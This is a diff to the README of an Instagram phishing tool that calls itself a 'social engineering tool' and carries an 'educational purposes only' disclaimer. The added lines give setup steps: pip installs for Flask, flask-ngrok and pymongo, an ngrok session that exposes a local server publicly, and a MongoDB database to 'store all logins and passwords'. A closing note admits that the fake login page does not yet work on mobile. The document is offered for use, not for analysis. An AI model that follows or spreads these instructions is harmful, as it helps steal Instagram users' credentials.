@@ -6,6 +6,7 @@ Socal engenerting tool for instagram(phishing tool)
 # Use for educational purposes only
 Yo this is not a toy dont use it in ilegal purposes use only for educational purposes
 
+# Usage 
 ```bash
 Session Status                online
 Account                       <your ngrok name> (Plan: Free)
@@ -17,3 +18,24 @@ Forwarding                    https://2b94-5-63-162-38.ngrok.io -> http://localh
 Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                               
                               0       0       0.00    0.00    0.00    0.00
 ```
+
+first you need to install python libraries and ngrok from offical website
+
+```bash
+pip install pyfiglet==0.7
+pip install colorama
+pip install Flask
+pip install flask-ngrok
+pip install pymongo
+pip install pygame
+pip install numpy
+pip install numba
+pip install opencv-python
+```
+After open text editor(or your ide) and open main.py file 
+You also need mongodb database to store all logins and passwords 
+
+# Note
+
+The login page front end is not working properly on mobile devices 
+So I will update the frontend soon
